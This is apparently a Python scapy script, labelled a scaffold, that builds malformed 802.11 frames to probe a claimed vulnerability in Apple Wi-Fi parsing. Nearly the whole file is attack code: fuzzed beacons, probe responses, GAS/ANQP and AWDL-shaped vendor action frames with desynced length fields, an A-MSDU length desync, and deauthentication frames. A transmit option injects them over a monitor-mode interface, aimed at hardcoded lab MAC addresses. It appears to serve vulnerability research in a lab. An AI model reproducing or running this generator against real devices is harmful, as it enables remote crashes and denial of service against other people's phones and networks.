#!/usr/bin/env python3
"""T1 / CVE-2026-64726 — 802.11 frame generator SCAFFOLD (scapy).

STATUS: SCAFFOLDING. Builds frames only. Nothing has been transmitted and no
crash has been observed. Default mode is dry-run (print + optional pcap).

Target topology (see ../RESEARCH.md 1b):
    iPhone personal hotspot  = AP radio   BSSID 86:88:06:47:a4:1a, ch149 (5745 MHz)
    lab iPad 9 iOS 18.7.8    = client    172.20.10.7   (T1 victim, unverified STA MAC)
    box (this host)          = client/injector 172.20.10.2, wlan0 Intel AX201/iwlwifi

Frames are emitted unassociated and unencrypted (mgmt/action classes need no
pairwise keys). Data-plane frames (h4_amsdu) are NOT key-valid and will be
dropped by a WPA2/3 target — they are here to exercise the generator only.

Usage:
    framegen.py list
    framegen.py gen -k h1_beacon_vendor_ie --ie-len 300
    framegen.py gen -k all -o /tmp/frames.pcap
    framegen.py gen -k h1_probe_resp --claimed-len 255 --ie-len 32 --fuzz 50 --seed 1
    framegen.py gen -k h5_deauth --send --iface mon0      # requires root + monitor iface
"""
import argparse
import os
import random
import sys

from scapy.all import (  # noqa: E402
    Dot11,
    Dot11Action,
    Dot11AssoReq,
    Dot11Auth,
    Dot11Beacon,
    Dot11Deauth,
    Dot11Elt,
    Dot11ProbeResp,
    LLC,
    PcapWriter,
    Raw,
    SNAP,
    RadioTap,
    conf,
    sendp,
)

APPLE_OUI = b"\x50\x6f\x9a"   # Apple (AirDrop / AWDL / Hotspot 2.0 vendor IEs)
WFA_OUI = b"\x00\x50\xf2"     # Wi-Fi Alliance (WPA, WMM, HS2.0)
BROADCOM_OUI = b"\x00\x10\x18"

# Live lab values (override with --bssid/--sa/--da/--ssid).
DEF_BSSID = "86:88:06:47:a4:1a"      # iPhone personal-hotspot AP radio (locally-admin BSSID)
DEF_SA = "e0:d4:64:cd:a2:fd"         # box wlan0 MAC (injector)
DEF_STA = "ff:ff:ff:ff:ff:ff"        # broadcast; pass --sta <iPad MAC> for unicast
DEF_SSID = b"pwned thanks free"
DEF_CHANNEL = 149


def craft_ie(ie_id, claimed_len, payload_len, fill=b"A"):
    """Length-desync IE: id byte, length byte CLAIMING claimed_len, but only
    payload_len bytes actually follow. This is the classic parser-desync shape
    ('improved memory handling' in the advisory most plausibly bounds this).
    claimed_len > payload_len  -> reader walks past the buffer (OOB read/over-read)
    claimed_len < payload_len  -> trailing bytes parsed as the next IE (smuggling)
    """
    body = (fill * (payload_len // len(fill) + 1))[:payload_len]
    return bytes([ie_id, claimed_len & 0xFF]) + body


def vendor_ie(oui, oui_type, payload, claimed_len=None):
    body = oui + bytes([oui_type]) + payload
    if claimed_len is None:
        claimed_len = len(body)
    return bytes([221, claimed_len & 0xFF]) + body


def dot11(**kw):
    """Thin wrapper kept for readability in the generators below."""
    return Dot11(**kw)


def wrap(frame, ctx):
    return RadioTap() / frame


# ---------------------------------------------------------------- generators

def h1_beacon_vendor_ie(ctx):
    """H1: Beacon carrying vendor-specific IEs with a desynced length byte.
    Victim hypothesis: scan-cache / IE deserialization in a userland process
    (wifid / Apple80211) that re-parses the firmware's up-delivered beacon."""
    n = ctx.ie_len
    claimed = ctx.claimed_len if ctx.claimed_len is not None else min(n, 255)
    payload = b"W" * max(n - 5, 0)
    ies = (
        Dot11Elt(ID="SSID", info=ctx.ssid)
        / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        / Dot11Elt(ID="DSset", info=bytes([ctx.channel]))
        / Raw(vendor_ie(WFA_OUI, 0x10, ctx.fuzz_bytes(16), claimed_len=claimed))
        / Raw(vendor_ie(APPLE_OUI, 0x09, ctx.fuzz_bytes(32)))          # HS2.0-ish
        / Raw(craft_ie(255, claimed, max(n - 2, 0)))                    # extended, desynced
    )
    b = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / Dot11Beacon(cap="ESS", timestamp=0, beacon_interval=100) / ies, ctx)


def h1_probe_resp(ctx):
    """H1 variant: Probe Response — same IE stream, but this is what the target's
    scan sends unicast at, so it is the cheapest way to reach a scan cache."""
    n = ctx.ie_len
    claimed = ctx.claimed_len if ctx.claimed_len is not None else min(n, 255)
    ies = (
        Dot11Elt(ID="SSID", info=ctx.ssid)
        / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        / Dot11Elt(ID="DSset", info=bytes([ctx.channel]))
        / Raw(vendor_ie(APPLE_OUI, 0x09, ctx.fuzz_bytes(48), claimed_len=claimed))
        / Raw(craft_ie(191, claimed, max(n - 2, 0)))                    # VHT caps, desynced
    )
    b = Dot11(type=0, subtype=5, addr1=ctx.addr1, addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / Dot11ProbeResp(cap="ESS", timestamp=0, beacon_interval=100) / ies, ctx)


def h1_assoc_req(ctx):
    """H1 variant: Association Request — the AP-role parser (iPhone hotspot)
    consumes this; vendor/RSN/HE IE desync reaches whoever deserializes it."""
    n = ctx.ie_len
    claimed = ctx.claimed_len if ctx.claimed_len is not None else min(n, 255)
    ies = (
        Dot11Elt(ID="SSID", info=ctx.ssid)
        / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        / Dot11Elt(ID="DSset", info=bytes([ctx.channel]))
        / Dot11Elt(ID=127, info=b"\x00" * 8)                # 127 = Extended Capabilities (numeric ID; scapy enum lacks the name)
        / Raw(vendor_ie(WFA_OUI, 0x20, ctx.fuzz_bytes(24), claimed_len=claimed))
        / Raw(craft_ie(255, claimed, max(n - 2, 0)))
    )
    b = Dot11(type=0, subtype=0, addr1=ctx.bssid, addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / Dot11AssoReq(cap=0x0411, listen_interval=10) / ies, ctx)


def h2_gas_anqp(ctx):
    """H2: Public Action (GAS/ANQP query). Unencrypted by standard, parsed above
    the driver in the Hotspot 2.0 / captive path — a userland-shaped surface.
    Desync is applied to the Query Data length field, the field a parser sizes
    its allocation from."""
    n = ctx.ie_len
    claimed = ctx.claimed_len if ctx.claimed_len is not None else min(n, 255)
    query = ctx.fuzz_bytes(n)
    adv_proto = bytes([0, 4, 0, 0x7F, 0x00])               # Advertisement Protocol IE
    gas = (
        bytes([0x04])                                       # Dialog Token
        + adv_proto
        + (claimed & 0xFFFF).to_bytes(2, "little")          # Query Data length (DESYNCED)
        + query
    )
    b = Dot11(type=0, subtype=13, addr1=ctx.addr1, addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / Dot11Action(category=4) / Raw(gas), ctx)


def h2_vendor_action(ctx):
    """H2: Vendor-Specific Action (category 127), Apple OUI. Unassociated,
    unencrypted; may be dropped by a PMF target if it classifies as robust.
    The OUI + action byte stay intact; the desync lives in the vendor payload's
    inner IE so the frame still parses as Apple up to the buggy element."""
    n = ctx.ie_len
    claimed = ctx.claimed_len if ctx.claimed_len is not None else min(n, 255)
    inner = craft_ie(255, claimed, max(n - 2, 0), fill=ctx.fuzz_bytes(1) or b"A")
    body = APPLE_OUI + b"\x10" + inner                       # 0x10 = vendor action template
    b = Dot11(type=0, subtype=13, addr1=ctx.addr1, addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / Dot11Action(category=127) / Raw(body), ctx)


def h3_awdl(ctx):
    """H3: Apple OUI vendor action in the AWDL shape (OUI 50:6f:9a + action byte).
    AWDL is device-to-device with no AP in the path -> best match for Apple's
    'physical proximity' wording. Payload is a TEMPLATE: refine from a real
    capture of the target's AWDL activity (airdrop/wifid enabled) before firing."""
    n = ctx.ie_len
    claimed = ctx.claimed_len if ctx.claimed_len is not None else min(n, 255)
    inner = craft_ie(255, claimed, max(n - 2, 0), fill=ctx.fuzz_bytes(1) or b"A")
    body = APPLE_OUI + b"\x04" + inner                       # 0x04 = AWDL action template
    b = Dot11(type=0, subtype=13, addr1=ctx.addr1, addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / Dot11Action(category=127) / Raw(body), ctx)


def h4_amsdu(ctx):
    """H4: QoS data with an A-MSDU subframe whose length field desyncs the
    reader. NOT key-valid on a WPA2/3 BSS: needs the hotspot pairwise key
    (capture the 4-way handshake first) before it means anything on air.
    FCfield 0x08 = QoS bit (scapy's 'QoS' flag string is not accepted here)."""
    n = ctx.ie_len
    claimed = ctx.claimed_len if ctx.claimed_len is not None else 0xFF
    da = bytes.fromhex("ffffffffffff")
    sa = bytes.fromhex(ctx.sa.replace(":", ""))
    subframe = da + sa + (claimed & 0xFFFF).to_bytes(2, "little") \
        + ctx.fuzz_bytes(max(n - 14, 0))
    b = Dot11(type=2, subtype=8, FCfield=0x08, addr1=ctx.addr1, addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / LLC(dsap=0xAA, ssap=0xAA, ctrl=3) / SNAP() / Raw(subframe), ctx)


def h5_deauth(ctx):
    """H5: benign-ish reachability probe (reason 7 = leaving). Use ONLY at the
    lab BSSID/STA; never broadcast at a live network you do not own."""
    b = Dot11(type=0, subtype=12, addr1=ctx.addr1, addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / Dot11Deauth(reason=7), ctx)


def h5_auth(ctx):
    """H5: open-system Authentication — proves the RF path reaches the AP-role
    parser (the iPhone hotspot) without mutating anything interesting."""
    b = Dot11(type=0, subtype=11, addr1=ctx.bssid, addr2=ctx.sa, addr3=ctx.bssid)
    return wrap(b / Dot11Auth(algo=0, seqnum=1, status=0), ctx)


GENERATORS = {
    "h1_beacon_vendor_ie": (h1_beacon_vendor_ie, "H1 Beacon vendor-IE length desync"),
    "h1_probe_resp": (h1_probe_resp, "H1 Probe Response vendor-IE length desync"),
    "h1_assoc_req": (h1_assoc_req, "H1 Association Request IE desync"),
    "h2_gas_anqp": (h2_gas_anqp, "H2 Public Action GAS/ANQP desync"),
    "h2_vendor_action": (h2_vendor_action, "H2 Vendor-Specific Action (cat 127)"),
    "h3_awdl": (h3_awdl, "H3 AWDL-shaped Apple vendor action"),
    "h4_amsdu": (h4_amsdu, "H4 A-MSDU subframe length desync (key-gated)"),
    "h5_deauth": (h5_deauth, "H5 reachability probe: deauth reason 7"),
    "h5_auth": (h5_auth, "H5 reachability probe: open auth"),
}


class Ctx:
    def __init__(self, args):
        self.bssid = args.bssid
        self.sa = args.sa
        self.addr1 = args.sta
        self.ssid = args.ssid.encode()
        self.channel = args.channel
        self.ie_len = args.ie_len
        self.claimed_len = args.claimed_len
        self.rng = random.Random(args.seed)

    def fuzz_bytes(self, n):
        return bytes(self.rng.randrange(256) for _ in range(n))


def hexdump(b, limit=64):
    h = b[:limit].hex()
    return " ".join(h[i:i + 32] for i in range(0, len(h), 32)) + (f" … (+{len(b)-limit}B)" if len(b) > limit else "")


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-64726 frame generator SCAFFOLD (dry-run by default)")
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("list", help="list frame kinds")
    g = sub.add_parser("gen", help="generate frames")
    g.add_argument("-k", "--kind", default="all", choices=sorted(GENERATORS) + ["all"])
    g.add_argument("--bssid", default=DEF_BSSID, help="AP BSSID (iPhone hotspot)")
    g.add_argument("--sa", default=DEF_SA, help="source addr (box radio)")
    g.add_argument("--sta", default=DEF_STA, help="addr1 / target STA MAC (iPad)")
    g.add_argument("--ssid", default=DEF_SSID.decode(), help="SSID")
    g.add_argument("--channel", type=int, default=DEF_CHANNEL)
    g.add_argument("--ie-len", type=int, default=64, help="payload bytes in the crafted element")
    g.add_argument("--claimed-len", type=int, default=None, help="length byte to claim (default = real)")
    g.add_argument("--fuzz", type=int, default=1, help="emit N fuzzed variants per kind")
    g.add_argument("--seed", type=int, default=0xC0FFEE)
    g.add_argument("-o", "--out", default=None, help="write frames to this pcap")
    g.add_argument("--send", action="store_true", help="TRANSMIT (requires root + monitor iface)")
    g.add_argument("--iface", default="mon0")
    g.add_argument("--interval", type=float, default=0.1, help="seconds between frames when sending")
    args = ap.parse_args()

    if args.cmd == "list":
        for k, (_, desc) in sorted(GENERATORS.items()):
            print(f"  {k:22s} {desc}")
        return 0

    kinds = sorted(GENERATORS) if args.kind == "all" else [args.kind]
    writer = PcapWriter(args.out, append=False, sync=True) if args.out else None
    frames = []
    for k in kinds:
        fn, desc = GENERATORS[k]
        for i in range(args.fuzz):
            args.seed = args.seed + i
            ctx = Ctx(args)
            try:
                f = fn(ctx)
            except Exception as e:  # generator bugs are not crash evidence
                print(f"[!] {k} variant {i}: BUILD FAILED: {e}")
                continue
            raw = bytes(f)
            frames.append(f)
            print(f"[+] {k:22s} v{i:<3d} {len(raw):4d}B  {desc}")
            print(f"      {hexdump(raw)}")
            if writer:
                writer.write(f)
    if writer:
        writer.close()
        print(f"[+] wrote {len(frames)} frames -> {args.out}")

    if args.send:
        if os.geteuid() != 0:
            print("[!] --send refused: must run as root (monitor-mode TX needs CAP_NET_RAW).", file=sys.stderr)
            return 2
        print(f"[!] TRANSMITTING {len(frames)} frames on {args.iface} — lab target only")
        for f in frames:
            sendp(f, iface=args.iface, inter=args.interval, verbose=False)
            print("[!] sent 1 frame")
    else:
        print("[*] dry-run only: no frames transmitted (add --send --iface mon0 as root to transmit)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
